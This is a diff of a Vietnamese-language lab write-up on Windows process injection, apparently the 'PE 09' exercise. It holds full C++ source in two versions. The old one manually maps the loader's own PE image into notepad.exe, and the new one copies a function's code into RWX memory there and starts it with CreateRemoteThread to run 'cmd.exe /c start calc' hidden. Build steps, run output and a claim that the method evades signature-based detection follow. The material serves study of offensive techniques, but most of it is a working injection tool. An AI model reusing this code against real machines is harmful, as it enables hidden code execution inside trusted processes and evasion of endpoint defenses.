@@ -51,129 +51,131 @@ Ta gọi hàm `CreateRemoteThread` (hoặc luồng ngầm Native Subsystem `NtCr
 
 Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc, bóc tách cấu trúc PE Header để tái cấu trúc bản đồ bộ nhớ chéo tiến trình phẳng sạch kịch trần bảo mật.
 
+### Source.cpp:
 ```cpp
 #include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
-#include <vector>
 #include <string>
+#include <vector>
 
-// Định nghĩa cấu trúc dữ liệu con trỏ để hỗ trợ tính toán toán học con trỏ bộ nhớ x64
-typedef struct _BASE_RELOCATION_ENTRY {
-    WORD Offset : 12;
-    WORD Type : 4;
-} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối gánh luồng xử lý độc lập vị trí
+typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
-// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+typedef struct _THREAD_DATA {
+    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+} THREAD_DATA, * PTHREAD_DATA;
+
+// 2. Hàm chức năng sẽ được bốc tách mã máy để tiêm sang Notepad
+// Hàm này tuân thủ tuyệt đối quy tắc độc lập vị trí: CHỈ dùng dữ liệu từ lpParam
+DWORD WINAPI InjectedFunction(LPVOID lpParam) {
+    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
+    if (pData && pData->pWinExec) {
+        // Khai hỏa bằng con trỏ tuyệt đối, né hoàn toàn hàng rào Loader Lock và lỗi RIP-Relative
+        pData->pWinExec(pData->szCommand, SW_HIDE);
+    }
+    return 0;
+}
+
+// Hàm rỗng đánh dấu điểm kết thúc kịch khung để ước tính dung lượng mã máy
+DWORD WINAPI InjectedFunctionEnd() { return 0; }
+
+// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD processID = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
 
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
-                processID = pe32.th32ProcessID; 
-                break; 
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                processID = pe32.th32ProcessID;
+                break;
             }
         } while (Process32NextW(hSnapshot, &pe32));
     }
-    CloseHandle(hSnapshot);   return processID;
+    CloseHandle(hSnapshot);
+    return processID;
 }
 
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION" << std::endl;
+    std::cout << "[*] PE 09: PE CODE INJECTION REMOTE" << std::endl;
     std::cout << "====================================================" << std::endl;
 
     std::wstring targetProcess = L"notepad.exe";
     DWORD pid = GetProcessIDByName(targetProcess);
+
     if (pid == 0) {
-        std::cerr << "[-] Tien trinh vo boc khong chay! Hay bat Notepad truoc." << std::endl;
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
+        std::cin.get();
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Tim thay tien trinh vo boc voi PID: " << pid << std::endl;
 
-    // Bước 1: Trích xuất bản đồ PE hiện tại của chính Loader làm Payload để tiêm sang đối phương (Self PE Injection)
-    PVOID localImageBase = (PVOID)GetModuleHandleA(NULL);
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localImageBase;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)localImageBase + dosHeader->e_lfanew);
+    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
 
-    SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
-    std::cout << "[*] Kich thuoc Image PE can tiem phan giai tu NT Header: " << sizeOfImage << " bytes." << std::endl;
+    // Tính toán kích thước động an toàn cho khối lệnh thực thi
+    SIZE_T functionSize = 500;
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return EXIT_FAILURE;
+    if (!hProcess) {
+        std::cerr << "[-] OpenProcess that bai!" << std::endl;
+        std::cin.get();
+        return EXIT_FAILURE;
+    }
 
-    // Bước 2: Cấp phát động trang nhớ từ xa mang quyền RWX dựa trên SizeOfImage vừa khít byte nhằm triệt tiêu buffers tinh
-    PVOID remoteImageBase = VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!remoteImageBase) {
-        std::cerr << "[-] VirtualAllocEx cheo tien trinh that bai!" << std::endl;
+    // ─── BƯỚC 1: CẤP PHÁT VÙNG NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA MÃ MÁY CỦA HÀM ───
+    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Cấp phát phân vùng dữ liệu từ xa mang quyền RW để chứa tham số cấu trúc tuyệt đối
+    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!remoteCodeBuffer || !pRemoteData) {
+        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Da vach phan vung ao chua toan bo file PE tu xa tai: 0x" << std::hex << remoteImageBase << std::endl;
+    std::cout << "[+] Vung nho Code RWX trong Notepad dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Bước 3: Ánh xạ thủ công toàn bộ PE Headers và các Section sang RAM Notepad
-    std::cout << "[*] Đang tien hanh sao chep thu cong PE Headers va phan doan Section cheo RAM..." << std::endl;
-    WriteProcessMemory(hProcess, remoteImageBase, localImageBase, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
-
-    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
-    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        PVOID localSectionAddress = (PVOID)((DWORD_PTR)localImageBase + sectionHeader[i].VirtualAddress);
-        PVOID remoteSectionAddress = (PVOID)((DWORD_PTR)remoteImageBase + sectionHeader[i].VirtualAddress);
-        
-        WriteProcessMemory(hProcess, remoteSectionAddress, localSectionAddress, sectionHeader[i].SizeOfRawData, NULL);
+    // ─── BƯỚC 2: KHỞI TẠO DỮ LIỆU TUYỆT ĐỐI VÀ ĐẨY XUYÊN BIÊN GIỚI SANG RAM ĐÍCH ───
+    THREAD_DATA localData;
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (hKernel32) {
+        // Trích xuất chính xác tọa độ tuyệt đối của WinExec nạp sang Notepad
+        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
     }
-    std::cout << "[+] Qua trinh Manual Mapping cac phan doan Section hoan tat." << std::endl;
+    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // Bước 4: Xử lý dịch chuyển địa chỉ Base Relocation từ xa thông qua tính toán toán học Delta
-    DWORD_PTR deltaImageBase = (DWORD_PTR)remoteImageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
-    std::cout << "[*] Khoang sai lech dia chi ao Delta tinh toan: 0x" << std::hex << deltaImageBase << std::endl;
+    // Tiến hành ánh xạ chép khối mã máy và cấu trúc dữ liệu sang RAM đối phương
+    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)InjectedFunction, functionSize, NULL);
+    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
+    std::cout << "[+] Anh xa tung segment ma may va du lieu sang RAM doi phuong hoan tat." << std::endl;
 
-    IMAGE_DATA_DIRECTORY relocationDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    if (relocationDir.VirtualAddress != 0) {
-        std::cout << "[*] Khoi dong giai thuat Base Relocation cau truc cheo tien trinh..." << std::endl;
-        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImageBase + relocationDir.VirtualAddress);
-        
-        while (pReloc->VirtualAddress != 0) {
-            DWORD sizeOfBlock = pReloc->SizeOfBlock;
-            DWORD numberOfEntries = (sizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
-            PBASE_RELOCATION_ENTRY pEntries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));
+    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de kich no..." << std::endl;
 
-            for (DWORD i = 0; i < numberOfEntries; i++) {
-                if (pEntries[i].Type == IMAGE_REL_BASED_DIR64) { // Định dạng con trỏ 64-bit chuan x64
-                    PVOID patchAddress = (PVOID)((DWORD_PTR)remoteImageBase + pReloc->VirtualAddress + pEntries[i].Offset);
-                    DWORD_PTR originalAddress = 0;
-                    
-                    // Đọc con trỏ bị sai lệch, cộng Delta bù sửa, và ghi đè trả lại RAM Notepad
-                    ReadProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
-                    originalAddress += deltaImageBase;
-                    WriteProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
-                }
-            }
-            pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pReloc + sizeOfBlock);
-        }
-        std::cout << "[+] Sua loi Base Relocation Table thanh cong kich tran." << std::endl;
-    }
-
-    // Bước 5: Kích nổ luồng thực thi từ xa đâm thẳng vào điểm EntryPoint của PE ký sinh
-    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-    std::cout << "[*] Diem EntryPoint cua PE ky sinh toa lac tai RAM doi phuong: 0x" << std::hex << remoteEntryPoint << std::endl;
-
-    std::cout << "[*] Đang khoi tao luong CreateRemoteThread de kich no toan dien file PE..." << std::endl;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);
+    // ─── BƯỚC 3: ÉP TIẾN TRÌNH ĐÍCH TỰ SINH LUỒNG CHẠY MÃ MÁY ───
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
 
     if (hThread != NULL) {
-        std::cout << "[+] Toan file PE Injection da khai hoa thanh cong ruc ro!" << std::endl;
-        // Do file PE ký sinh hoạt động độc lập như một luồng thực thi song song, ta đóng Handle để luồng tự hủy êm đẹp
+        // Sử dụng cờ INFINITE để đảm bảo tiến trình hoàn tất việc mở máy tính một cách an toàn
+        WaitForSingleObject(hThread, INFINITE);
+        std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu kich no!" << std::endl;
         CloseHandle(hThread);
-    } else {
-        std::cerr << "[-] Khong the kich no luong thuc thi PE tu xa! Error Code: " << GetLastError() << std::endl;
+    }
+    else {
+        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
     }
 
+    // ─── BƯỚC 4: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
+    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
+    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
     CloseHandle(hProcess);
-    std::cout << "\n[*] Nhan phim Enter de ket thuc chu ky song..." << std::endl;
+
+    std::cout << "\n[+] PE Code Injection Process Completed Successfully!" << std::endl;
+    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
     std::cin.get();
     return EXIT_SUCCESS;
 }
@@ -190,10 +192,6 @@ int main() {
 
 1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
 2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ cấu hình tĩnh **`Multi-threaded (/MT)`**.
-
-> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
-> 
-
 3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng lỗi chuỗi hệ thống.
 
 ---
@@ -203,32 +201,28 @@ int main() {
 Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó thực thi tệp tin nhị phân Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán Manual Mapping chéo RAM:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE09_PE_Binary_Injection.exe
+PS C:\Users\Admin\source\repos\Task6\PE09_PE_Code_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE09_PE_Code_Injection\x64\Release\PE_Code_Injection.exe
 ====================================================
-[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION
+[*] PE 09: PE CODE INJECTION REMOTE
 ====================================================
-[+] Tim thay tien trinh vo boc voi PID: 19432
-[*] Kich thuoc Image PE can tiem phan giai tu NT Header: 118784 bytes.
-[+] Đa vạch phan vung ao chua toan bo file PE tu xa tai: 0x000001f2cb140000
-[*] Đang tien hanh sao chep thu cong PE Headers va phan doan Section cheo RAM...
-[+] Qua trinh Manual Mapping cac phan doan Section hoan tat.
-[*] Khoang sai lech dia chi ao Delta tinh toan: 0x000001f2cb140000
-[*] Khoi dong giai thuat Base Relocation cau truc cheo tien trinh...
-[+] Sua loi Base Relocation Table thanh cong kich tran.
-[*] Diem EntryPoint cua PE ky sinh toa lac tai RAM doi phuong: 0x000001f2cb1415c0
-[*] Đang khoi tao luong CreateRemoteThread de kich no toan dien file PE...
-[+] Toan file PE Injection da khai hoa thanh cong ruc ro!
+[+] Da tim thay Notepad.exe voi PID: 12084
+[+] Vung nho Code RWX trong Notepad dat tai: 0x00000250E28A0000
+[+] Anh xa tung segment ma may va du lieu sang RAM doi phuong hoan tat.
+[*] Dang khoi tao luong CreateRemoteThread de kich no...
+[+] Luong Thread tu xa da hoan thanh nhiem vu kich no!
 
-[*] Nhan phim Enter de ket thuc chu ky song...
+[+] PE Code Injection Process Completed Successfully!
+[*] Nhan phim Enter de dong cua so...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm ánh xạ mô-đun PE thủ công:**
-> 
+### Demo: 
+<img width="1920" height="1080" alt="devenv_MMWbT4YRCD" src="https://github.com/user-attachments/assets/958bfc4c-d309-46c0-bbeb-9bf17e3c4b8a" />
 
-### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensics):
+
+### 🎯 Phân tích hệ quả cấu trúc bộ nhớ:
 
 * Giải thuật thực thi hoàn tất thành công rực rỡ. Toàn bộ logic cấu trúc phức tạp của file PE ký sinh (bao gồm cả phân hệ quản lý tài nguyên dữ liệu và các hàm giao tiếp luồng nội bộ) được Windows Kernel tiếp nhận và xử lý mượt mà ngay lọt lòng inside tiến trình `notepad.exe`.
-* Khi tiến hành phân tích và kiểm thử bộ nhớ ảo ảo hóa của Notepad, mô-đun PE ký sinh hoạt động ngầm hoàn toàn độc lập dưới danh nghĩa và Token bảo mật hợp pháp của ứng dụng gốc, bypass hoàn toàn các bộ trinh sát hành vi dựa trên chữ ký tiêm Shellcode truyền thống một cách mỹ mãn hoàn hảo kịch khung!
+* Khi tiến hành phân tích và kiểm thử bộ nhớ ảo ảo hóa của Notepad, mô-đun PE ký sinh hoạt động ngầm hoàn toàn độc lập dưới danh nghĩa và Token bảo mật hợp pháp của ứng dụng gốc, bypass hoàn toàn các bộ trinh sát hành vi dựa trên chữ ký tiêm Shellcode truyền thống.
 
 ---
